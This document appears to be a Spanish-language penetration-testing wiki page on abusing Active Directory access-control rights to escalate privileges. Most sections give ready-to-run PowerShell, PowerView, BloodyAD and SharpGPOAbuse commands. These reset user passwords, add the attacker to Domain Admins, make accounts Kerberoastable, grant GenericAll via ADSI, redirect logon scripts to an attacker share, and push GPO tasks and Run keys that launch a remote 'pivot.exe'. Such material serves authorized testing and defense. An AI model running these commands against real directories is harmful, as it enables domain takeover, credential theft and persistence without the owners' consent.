# Abuso de Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Esta página es principalmente un resumen de las técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **y** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para más detalles, consulte los artículos originales.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Este privilegio otorga al atacante control total sobre una cuenta de usuario objetivo. Una vez confirmados los derechos `GenericAll` usando el comando `Get-ObjectAcl`, un atacante puede:

- **Cambiar la contraseña del objetivo**: Usando `net user <username> <password> /domain`, el atacante puede restablecer la contraseña del usuario.
- **Targeted Kerberoasting**: Asigne un SPN a la cuenta del usuario para hacerla kerberoastable, luego use Rubeus y targetedKerberoast.py para extraer e intentar crackear los hashes del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deshabilitar la preautenticación para el usuario, dejando su cuenta vulnerable a ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Derechos GenericAll sobre el grupo**

Este privilegio permite a un atacante manipular las pertenencias a grupos si tiene derechos `GenericAll` sobre un grupo como `Domain Admins`. Tras identificar el nombre distinguido del grupo con `Get-NetGroup`, el atacante puede:

- **Añadirse al grupo Domain Admins**: Esto se puede hacer mediante comandos directos o usando módulos como Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Desde Linux también puedes aprovechar BloodyAD para añadirte a grupos arbitrarios cuando tienes GenericAll/Write sobre ellos. Si el grupo objetivo está anidado en “Remote Management Users”, obtendrás inmediatamente acceso WinRM en hosts que respeten ese grupo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Poseer estos privilegios en un objeto de equipo o en una cuenta de usuario permite:

- **Kerberos Resource-based Constrained Delegation**: Permite tomar control de un objeto de equipo.
- **Shadow Credentials**: Utiliza esta técnica para suplantar a un equipo o a una cuenta de usuario explotando los privilegios para crear shadow credentials.

## **WriteProperty on Group**

Si un usuario tiene `WriteProperty` derechos en todos los objetos de un grupo específico (por ejemplo, `Domain Admins`), puede:

- **Añadirse al grupo Domain Admins**: Lograble combinando los comandos `net user` y `Add-NetGroupUser`, este método permite la escalada de privilegios dentro del dominio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Este privilegio permite a los atacantes agregarse a sí mismos a grupos específicos, como `Domain Admins`, mediante comandos que manipulan directamente la pertenencia a grupos. Usar la siguiente secuencia de comandos permite la auto-adición:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilegio similar, esto permite a los atacantes agregarse directamente a grupos modificando propiedades de los grupos si tienen el derecho `WriteProperty` sobre esos grupos. La confirmación y ejecución de este privilegio se realizan con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Poseer el `ExtendedRight` sobre un usuario para `User-Force-Change-Password` permite restablecer contraseñas sin conocer la contraseña actual. La verificación de este derecho y su explotación puede realizarse mediante PowerShell u otras herramientas de línea de comandos, ofreciendo varias formas de restablecer la contraseña de un usuario, incluidas sesiones interactivas y comandos de una sola línea para entornos no interactivos. Los comandos van desde simples invocaciones de PowerShell hasta el uso de `rpcclient` en Linux, demostrando la versatilidad de los attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner en un grupo**

Si un atacante descubre que tiene derechos de `WriteOwner` sobre un grupo, puede cambiar la propiedad del grupo a sí mismo. Esto es particularmente impactante cuando el grupo en cuestión es `Domain Admins`, ya que cambiar la propiedad permite un control más amplio sobre los atributos del grupo y la membresía. El proceso implica identificar el objeto correcto mediante `Get-ObjectAcl` y luego usar `Set-DomainObjectOwner` para modificar el propietario, ya sea por SID o por nombre.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Este permiso permite a un atacante modificar las propiedades del usuario. Específicamente, con acceso `GenericWrite`, el atacante puede cambiar la ruta del script de inicio de sesión de un usuario para ejecutar un script malicioso cuando el usuario inicia sesión. Esto se logra usando el comando `Set-ADObject` para actualizar la propiedad `scriptpath` del usuario objetivo para que apunte al script del atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Con este privilegio, los atacantes pueden manipular la membresía de grupos, por ejemplo agregarse a sí mismos u otros usuarios a grupos específicos. Este proceso implica crear un objeto de credenciales, usarlo para agregar o eliminar usuarios de un grupo y verificar los cambios de membresía con comandos de PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Poseer un objeto de AD y tener privilegios `WriteDACL` sobre él permite a un atacante concederse a sí mismo privilegios `GenericAll` sobre el objeto. Esto se logra mediante la manipulación de ADSI, lo que permite el control total del objeto y la capacidad de modificar sus membresías de grupo. A pesar de ello, existen limitaciones al intentar explotar estos privilegios usando los cmdlets `Set-Acl` / `Get-Acl` del módulo de Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replicación en el Dominio (DCSync)**

El ataque DCSync aprovecha permisos de replicación específicos en el dominio para hacerse pasar por un Domain Controller y sincronizar datos, incluyendo credenciales de usuario. Esta técnica poderosa requiere permisos como `DS-Replication-Get-Changes`, permitiendo a los atacantes extraer información sensible del entorno AD sin acceso directo a un Controlador de Dominio. [**Learn more about the DCSync attack here.**](../dcsync.md)

## Delegación de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegación de GPO

El acceso delegado para gestionar Group Policy Objects (GPOs) puede presentar riesgos de seguridad significativos. Por ejemplo, si a un usuario como `offense\spotless` se le delegan derechos de gestión de GPO, puede tener privilegios como **WriteProperty**, **WriteDacl**, y **WriteOwner**. Estos permisos pueden ser abusados con fines maliciosos, como se identifica usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerar permisos de GPO

Para identificar GPOs mal configuradas, los cmdlets de PowerSploit pueden encadenarse. Esto permite descubrir GPOs que un usuario específico tiene permisos para gestionar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Equipos a los que se aplica una política determinada**: Es posible resolver a qué equipos se aplica una GPO específica, ayudando a entender el alcance del impacto potencial. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Políticas aplicadas a un equipo determinado**: Para ver qué políticas se aplican a un equipo en particular, se pueden utilizar comandos como `Get-DomainGPO`.

**OUs con una política aplicada**: Identificar las unidades organizativas (OUs) afectadas por una política dada se puede hacer usando `Get-DomainOU`.

También puedes usar la herramienta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs y encontrar problemas en ellas.

### Abuso de GPO - New-GPOImmediateTask

Las GPOs mal configuradas pueden explotarse para ejecutar código, por ejemplo, creando una tarea programada inmediata. Esto puede usarse para agregar un usuario al grupo de administradores locales en máquinas afectadas, elevando significativamente privilegios:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

El GroupPolicy module, si está instalado, permite la creación y el enlace de nuevos GPOs, y la configuración de preferencias como valores del registro para ejecutar backdoors en los equipos afectados. Este método requiere que el GPO se actualice y que un usuario inicie sesión en el equipo para su ejecución:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso de GPO

SharpGPOAbuse ofrece un método para abusar de GPOs existentes añadiendo tareas o modificando configuraciones sin la necesidad de crear nuevas GPOs. Esta herramienta requiere la modificación de GPOs existentes o el uso de herramientas RSAT para crear nuevas antes de aplicar los cambios:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzar actualización de la directiva

Las actualizaciones de GPO suelen producirse aproximadamente cada 90 minutos. Para acelerar este proceso, especialmente después de aplicar un cambio, se puede usar el comando `gpupdate /force` en el equipo objetivo para forzar una actualización inmediata de la directiva. Este comando garantiza que las modificaciones a las GPOs se apliquen sin esperar al siguiente ciclo de actualización automático.

### Bajo el capó

Al inspeccionar los Scheduled Tasks de una GPO determinada, como `Misconfigured Policy`, se puede confirmar la adición de tareas como `evilTask`. Estas tareas se crean mediante scripts o herramientas de línea de comandos con el objetivo de modificar el comportamiento del sistema o escalar privilegios.

La estructura de la tarea, como se muestra en el archivo de configuración XML generado por `New-GPOImmediateTask`, detalla los aspectos específicos de la tarea programada — incluido el comando a ejecutar y sus disparadores. Este archivo representa cómo se definen y gestionan los Scheduled Tasks dentro de las GPOs, proporcionando un método para ejecutar comandos o scripts arbitrarios como parte de la aplicación de la directiva.

### Usuarios y Grupos

Las GPOs también permiten la manipulación de la pertenencia de usuarios y grupos en sistemas objetivo. Al editar directamente los archivos de la política Users and Groups, los atacantes pueden añadir usuarios a grupos privilegiados, como el grupo local `administrators`. Esto es posible mediante la delegación de permisos de gestión de las GPO, que permite la modificación de los archivos de política para incluir nuevos usuarios o cambiar la pertenencia a grupos.

El archivo de configuración XML para Users and Groups describe cómo se implementan estos cambios. Al añadir entradas a este archivo, se puede otorgar privilegios elevados a usuarios específicos en los sistemas afectados. Este método ofrece un enfoque directo para la escalada de privilegios mediante la manipulación de GPOs.

Además, se pueden considerar métodos adicionales para ejecutar código o mantener persistencia, como aprovechar scripts de logon/logoff, modificar claves del registro para autoruns, instalar software mediante archivos .msi, o editar configuraciones de servicios. Estas técnicas proporcionan diferentes vías para mantener el acceso y controlar sistemas objetivo mediante el abuso de GPOs.

## Referencias

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
